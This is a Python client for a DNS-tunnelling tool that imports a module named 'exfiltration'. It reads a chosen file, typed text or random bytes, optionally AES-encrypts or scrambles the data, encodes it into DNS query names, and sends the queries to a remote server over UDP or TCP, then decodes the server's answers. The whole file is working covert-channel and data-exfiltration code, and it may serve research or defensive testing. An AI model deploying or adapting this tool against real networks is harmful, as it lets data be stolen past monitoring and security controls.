#!/usr/bin/env python3
# coding: utf-8

import sys
import time
import base64
import random
import select
import socket
import struct
import hashlib
import binascii
import argparse

import dnslib as dns
import exfiltration as exf

class Client():
    def __init__(self, addr, args):
        self.sock = None
        self.addr = addr
        self.timeout = args.timeout
        self.domain = args.domain
        self.qtype = args.qtype.upper()
        self.modes = (args.text, args.rand, args.file)
        self.key = (args.aes_key or args.scramble)
        self.force_tcp = args.force_tcp
        
        try:
            self.udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.udp_sock.settimeout(self.timeout)
            self.udp_sock.connect(self.addr)

            self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.tcp_sock.settimeout(self.timeout)
            self.tcp_sock.setblocking(True)
            self.tcp_sock.connect(self.addr)

        except Exception:
            print("[Init]", "TCP connection to the server is not established!")
            self.tcp_sock.close()
            self.udp_sock.close()
            sys.exit(1)

    def run(self):
        while True:
            try:
                if (self.modes[0]):
                    data = self.read_text()
                elif (self.modes[1]):
                    data = self.read_random()
                    time.sleep(5)
                elif (self.modes[2]):
                    data = self.read_file()
                
                old_hash = hashlib.sha1(data).digest()

                if (type(self.key) == list):
                    queries = self.dns_ask(data, base64.urlsafe_b64encode, exf.scramble, self.key)
                elif (type(self.key) == str):
                    queries = self.dns_ask(data, base64.urlsafe_b64encode, exf.aes_encrypt, self.key)
                else:
                    queries = self.dns_ask(data, base64.urlsafe_b64encode, None)
                
                answers = []
                for q in queries:
                    if (self.force_tcp):
                        response = self.send_recv(self.tcp_sock, q)
                    else:
                        response = self.send_recv(self.udp_sock, q)
                    
                    if (response == b'tcp'):
                        response = self.send_recv(self.tcp_sock, q)
                    answers += [response]
               
                new_data = self.dns_extract(answers)

                if (self.modes[0]):
                    print("<", new_data.decode())
                elif (self.modes[1]):
                    new_hash = hashlib.sha1(new_data).digest()
                    print("$", new_hash.hex(), new_hash == old_hash)
                elif (self.modes[2]): 
                    with open('downloaded.txt', 'wb') as file:
                        file.write(new_data)
                    print("File downloaded.txt is saved!")
                    break
                
            except (KeyboardInterrupt, SystemExit):
                print("[Interrupt] Exit by the user...")
                break
            except Exception as error:
                print("[Info]", str(error))
                break
            except socket.error as error:
                print("[Socket]", str(error))
                break
            except socket.timeout:
                print("[Info]", "Server response timed out! Exiting...")
                break
        
        self.tcp_sock.close()
        self.udp_sock.close()

    def send_recv(self, sock, data=None):
        if (sock is self.udp_sock):
            dns_tcp_len = b''
        else:
            dns_tcp_len = struct.pack("!H", len(data))
        
        if (data):
            sock.send(dns_tcp_len + data)
        response = sock.recv(exf.SOCK_BUFFER_SIZE)

        if (sock is self.tcp_sock):
            response = response[2:]
        
        if not response:
            raise Exception('Error in getting a response!')
        return response

    def read_text(self):
        return input("> ").encode()

    def read_random(self):
        size = random.choice([32, 64, 128, 256, 512, 768])
        return exf.random_bytes(size)

    def read_file(self, buffer=32):
        whole = b''
        with open(self.modes[2], 'rb') as file:
            data = file.read(buffer)
            line = 0

            while (data):
                whole += data.ljust(buffer, b'\0')  
                data = file.read(buffer)
                line += 1

        return whole

    def dns_ask(self, big_data, base_enc, encrypt=None, *args):
        if encrypt is exf.aes_encrypt:
            data = exf.chunk(big_data, exf.MAX_ENC_DATA_LEN)
        else:
            data = exf.chunk(big_data, exf.MAX_RAW_DATA_LEN)

        if encrypt:
            data = [encrypt(i, *args) for i in data]

        enc_key = ""
        if (args):
            enc_key = args[0].encode() if isinstance(args[0], str) else bytearray(args[0])
            enc_key = exf.scramble(enc_key, (4, 12))
            enc_key = exf.domain_encode(enc_key, self.domain, base_enc)

        labels = [exf.domain_encode(i, self.domain, base_enc) for i in data]
        
        queries = []
        for i in labels:
            d = dns.DNSRecord.question(i, self.qtype)
            if (enc_key):
                d.add_question(dns.DNSQuestion(enc_key, dns.QTYPE.TXT))
            queries += [d.pack()]
        
        return queries

    def dns_extract(self, answers):
        result = b''
        for answer in answers:
            reply = dns.DNSRecord.parse(answer)
            qtype = reply.q.qtype

            for rd in reply.rr:
                if (qtype == dns.QTYPE.A or qtype == dns.QTYPE.AAAA):
                    result += exf.ip_decode(rd)
                elif (qtype == dns.QTYPE.TXT):
                    result += rd.rdata.data[0]
                else:
                    result += exf.domain_decode(str(rd.rdata.label), base64.urlsafe_b64decode)
        
        result = exf.scramble(result, (3, 11), True)
        return result

# --------------------------------------------------------------------------------------------------

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="DNS Client script")
    
    parser.add_argument('-c', '--connect', dest='conn', type=str, required=True,
                        help='Establishes a connection to the server at the specified address:port')
    
    parser.add_argument('-t', '--timeout', dest='timeout', type=int, default=60,
                        help="Specifies the timeout for server UDP response")
    
    parser.add_argument('-T', '--send-text', dest='text', action='store_true',
                        help='Sends a text string to the server')
    
    parser.add_argument('-F', '--send-file', dest='file', type=str,
                        help='Sends the file to the server. The file path is required.')
    
    parser.add_argument('-R', '--send-random', dest='rand', action='store_true',
                        help='Sends a random byte array to the server')
    
    parser.add_argument('-d', '--domain', dest='domain', type=str, default='example.com',
                        help='Specifies the domain name')
    
    parser.add_argument('-q', '--qtype', dest='qtype', type=str, default="A",
                        help='Specifies the type of record for a DNS question')
    
    parser.add_argument('-s', '--scramble', dest='scramble', type=int, nargs='+',
                        help='Scrambles outgoing traffic passing through the DNS tunnel.\n'+
                            'You need to specify an offset, e.g. (3, 11)')

    parser.add_argument('-a', '--aes', dest='aes_key', type=str,
                        help='Encrypts with AES outgoing traffic passing through the DNS tunnel.\n'+
                            'You need to specify an encryption key')

    parser.add_argument('-S', '--tcp', dest='force_tcp', action='store_true',
                        help='Forcibly sends DNS messages over TCP connection') 

    args = parser.parse_args()
    
    if (args.text and args.file and args.rand) or\
        (not args.text and not args.file and not args.rand) or\
        (args.text and args.file) or\
        (args.text and args.rand) or\
        (args.file and args.rand):
       parser.error('Only or at least one sending mode must be specified!')

    if (args.aes_key and args.scramble):
        parser.error('Only encryption or scrambling must be specified!')

    if (args.scramble and len(args.scramble) > 2):
        parser.error('Only two values must be specified for the offset!')

    if (args.aes_key):
        if (len(args.aes_key) < 3):
            parser.error('AES key is less than 3 characters long!')

    if (args.text):
        print("[Mode]", f"Sending text")
    elif (args.file):
        print("[Mode]", f"Sending {args.file}")
    elif (args.rand):
        print("[Mode]", f"Sending random bytes")
    print('[Record Type]', f"{dns.QTYPE.get(args.qtype)}")
    print("[Server Address]", f"{args.conn}")

    addr = args.conn.split(':')
    client = Client((addr[0], int(addr[1])), args)
    client.run()